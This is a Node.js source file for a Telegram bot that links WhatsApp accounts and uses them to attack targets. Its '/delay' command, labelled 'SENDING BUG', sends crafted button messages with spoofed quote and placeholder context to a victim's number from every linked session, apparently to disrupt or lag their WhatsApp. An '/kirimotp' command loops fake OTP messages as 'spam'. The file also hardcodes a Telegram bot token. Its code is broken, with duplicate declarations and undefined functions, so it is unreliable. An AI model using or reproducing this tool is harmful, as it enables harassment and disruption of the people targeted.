const config = require("./config");
const TelegramBot = require("node-telegram-bot-api");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateMessageTag,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
    generateMessageID,
} = require('@whiskeysockets/baileys');
const fs = require("fs");
const P = require("pino");
const axios = require("axios");
const figlet = require("figlet");
const startTime = Date.now();

function isPremium(userId) {
  return premiumUsers.includes(userId.toString());
}
const crypto = require("crypto");
const path = require("path");
const chalk = require("chalk");
const bot = new TelegramBot(token, { polling: true });
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const sessions = new Map();
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

const defaultSettings = {
  cooldown: 60, // detik
  groupOnly: false
};

if (!fs.existsSync('./settings.json')) {
  fs.writeFileSync('./settings.json', JSON.stringify(defaultSettings, null, 2));
}

let settings = JSON.parse(fs.readFileSync('./settings.json'));

const cooldowns = new Map();

function runtime() {
  const ms = Date.now() - startTime;
  const seconds = Math.floor(ms / 1000) % 60;
  const minutes = Math.floor(ms / (1000 * 60)) % 60;
  const hours = Math.floor(ms / (1000 * 60 * 60)) % 24;
  const days = Math.floor(ms / (1000 * 60 * 60 * 24));
  return `${days}d ${hours}h ${minutes}m ${seconds}s`;
}

function badge(userId) {
  return {
    premium: isPremium(userId) ? "✅" : "❌",
    supervip: isSupervip(userId) ? "✅" : "❌"
  };
}
//msg.key.id

function dateTime() {
  const now = new Date();
  const formatter = new Intl.DateTimeFormat("id-ID", {
    timeZone: "Asia/Jakarta",
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: false
  });

  const parts = formatter.formatToParts(now);
  const get = (type) => parts.find(p => p.type === type).value;

  return `${get("day")}-${get("month")}-${get("year")} ${get("hour")}:${get("minute")}:${get("second")}`;
}

// Token Bot Telegram
const token = '8161837253:AAHcyGQdM81yb_WEz57fVyxCi7JlknWNl-Q';
const bot = new TelegramBot(token, { polling: true });

const fakeOTP = () => Math.floor(100000 + Math.random() * 900000).toString();
const spamInterval = {};
const cooldowns = new Map();
const sessions = new Map(); // Placeholder bot WhatsApp
const settings = { cooldown: 60 }; // Cooldown 60 detik


function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}
//fungsi penginisialisasi
async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}
//otomatis membuat file session
function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}
//function info koneksi message bot
async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `
\`\`\`
╭━━━⭓「 𝐒𝐓𝐀𝐑𝐓 ☇ 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 ° 」
║  𝐒𝐓𝐀𝐓𝐔𝐒 : ⏳
┃  𝐁𝐎𝐓 : ${botNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
\`\`\`
╭━━━⭓「 𝐑𝐄 ☇ 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 ° 」
║  𝐒𝐓𝐀𝐓𝐔𝐒 : ⏳
┃  𝐁𝐎𝐓 : ${botNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
        \`\`\`
╭━━━⭓「 𝐋𝐎𝐒𝐓 ☇ 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 ° 」
║  𝐒𝐓𝐀𝐓𝐔𝐒 : ❌
┃  𝐁𝐎𝐓 : ${botNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
        \`\`\`
╭━━━⭓「 ☇ 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 ° 」
║  𝐒𝐓𝐀𝐓𝐔𝐒 : ✅
┃  𝐁𝐎𝐓 : ${botNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
            \`\`\`
╭━━━⭓「 𝐏𝐀𝐢𝐑𝐢𝐍𝐆  ☇ 𝐂𝐨𝐃𝐄 ° 」
║  𝐂𝐎𝐃𝐄 : ${formattedCode}
┃  𝐁𝐎𝐓 : ${botNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
          \`\`\`
╭━━━⭓「 𝐏𝐀𝐢𝐑𝐢𝐍𝐆 ☇ 𝐄𝐑𝐑𝐨𝐑 ° 」
║  𝐑𝐄𝐀𝐒𝐨𝐍 : ${error.message}
┃  𝐁𝐎𝐓 : ${botNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

// === FUNCTION QUOTED ===
async function quoted(bot, peler, msg = {}, buffer = null) {
  try {
    const buttons = [
      { buttonId: "yes", buttonText: { displayText: "✅ Ya" }, type: 1 },
      { buttonId: "no", buttonText: { displayText: "❌ Tidak" }, type: 1 }
    ];

    const buttonMessage = {
      text: "Coming",
      footer: "Vonzie Bot",
      buttons: buttons,
      headerType: 1,
      contextInfo: {
        mentionedJid: [peler],
        quotedAd: {
          advertiserName: " D ",
          caption: " D "
        },
        placeholderKey: {
          remoteJid: "0@s.whatsapp.net",
          fromMe: false,
          id: msg?.message_id || "default"
        }
      }
    };

    await bot.sendMessage(peler, buttonMessage);
  } catch (err) {
    console.error("Gagal kirim pesan button quotedAd:", err);
  }
}

// === /start ===
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, `Selamat datang ${msg.from.first_name}!\n\nGunakan perintah:\n/kirimotp <nomor> untuk mengirim OTP terus menerus.`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "Mulai Kirim OTP", callback_data: "startotp" }],
        [{ text: "Stop Kirim OTP", callback_data: "stopotp" }]
      ]
    }
  });
});

// === /kirimotp ===
bot.onText(/\/kirimotp (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const nomor = match[1];

  if (spamInterval[chatId]) {
    return bot.sendMessage(chatId, `❌ Kirim OTP sedang berjalan!\nGunakan tombol *Stop Kirim OTP*.`, { parse_mode: "Markdown" });
  }

  bot.sendMessage(chatId, `✅ Mulai mengirim OTP ke *${nomor}*...`, { parse_mode: "Markdown" });

  spamInterval[chatId] = setInterval(() => {
    const otp = fakeOTP();
    bot.sendMessage(chatId, `📲 OTP untuk ${nomor}:\n\n*${otp}*`, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: `📋 Salin OTP`, callback_data: `copy_${otp}` }]
        ]
      }
    });
  }, 5000); // setiap 5 detik
});

// === /addbot ===

bot.onText(/\/addbot(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;

  // Akses hanya untuk OWNER & SVIP
  if (!isOwner(msg.from.id) && !isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❗*LU SIAPA GOBLOK?!* Hanya OWNER & SVIP yang bisa tambah bot.",
      { parse_mode: "Markdown" }
    );
  }

  // Validasi input
  if (!match || !match[1]) {
    return bot.sendMessage(chatId, "❗️Contoh penggunaan:\n`/addbot 62xxxxxxxxxx`", {
      parse_mode: "Markdown",
    });
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  if (botNumber.length < 10) {
    return bot.sendMessage(chatId, "❗️Nomor tidak valid.");
  }

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in /addbot:", error);
    bot.sendMessage(
      chatId,
      "⚠️ Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

// === /delay ===
bot.onText(/\/delay(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const COOLDOWN_TIME = settings.cooldown * 1000;
  const now = Date.now();

  try {
    if (!isPremium(userId) && !isSupervip(userId)) {
      return bot.sendMessage(chatId, "❌ Anda Tidak Memiliki Akses!", { parse_mode: "Markdown" });
    }

    const inputNumber = match[1];
    if (!inputNumber) {
      return bot.sendMessage(chatId, "❗️Example : /delay 62xxx", { parse_mode: "Markdown" });
    }

    const formattedNumber = inputNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang aktif. Gunakan /addbot terlebih dahulu.");
    }

    const lastUsage = cooldowns.get(userId);
    if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
      const remainingTime = Math.ceil((COOLDOWN_TIME - (now - lastUsage)) / 1000);
      return bot.sendMessage(chatId, `⏱️ Tunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`);
    }

    cooldowns.set(userId, now);

    await bot.sendPhoto(chatId, "https://files.catbox.moe/qp2uhp.png", {
      caption: `
\`\`\`
╭━━━⭓「 SENDING BUG 」
║ ◇ 𝐃𝐀𝐓𝐄 : ${dateTime()}
┃ ◇ 𝐒𝐄𝐍𝐃𝐄𝐑 : @${msg.from.username}
┃ ◇ 𝐌𝐄𝐓𝐇𝐎𝐃𝐒 : DELAY
║ ◇ 𝐓𝐀𝐑𝐆𝐄𝐓𝐒 : ${formattedNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」", url: `https://wa.me/${formattedNumber}` }
          ]
        ]
      }
    });

    for (const [botNum, sock] of sessions.entries()) {
      try {
        await quoted(sock, jid, msg, null);
      } catch (err) {
        console.error(`Error in bot ${botNum}:`, err.message);
      }
    }

  } catch (error) {
    console.error("DELAY ERROR:", error);
    await bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});

// === CALLBACK HANDLER ===
bot.on("callback_query", (callbackQuery) => {
  const msg = callbackQuery.message;
  const chatId = msg.chat.id;
  const data = callbackQuery.data;

  if (data === "startotp") {
    bot.sendMessage(chatId, "Kirim perintah:\n`/kirimotp 08xxxx`", { parse_mode: "Markdown" });
  }

  if (data === "stopotp") {
    if (spamInterval[chatId]) {
      clearInterval(spamInterval[chatId]);
      delete spamInterval[chatId];
      bot.sendMessage(chatId, `✅ Kirim OTP telah dihentikan.`);
    } else {
      bot.sendMessage(chatId, `⚠️ Tidak ada pengiriman OTP yang berjalan.`);
    }
  }

  if (data.startsWith("copy_")) {
    const otp = data.split("copy_")[1];
    bot.answerCallbackQuery(callbackQuery.id, { text: `OTP "${otp}" telah disalin!`, show_alert: false });
  }
});

// === ERROR GLOBAL HANDLER ===
process.on("unhandledRejection", (reason) => {
  console.error("Unhandled Promise Rejection:", reason);
});
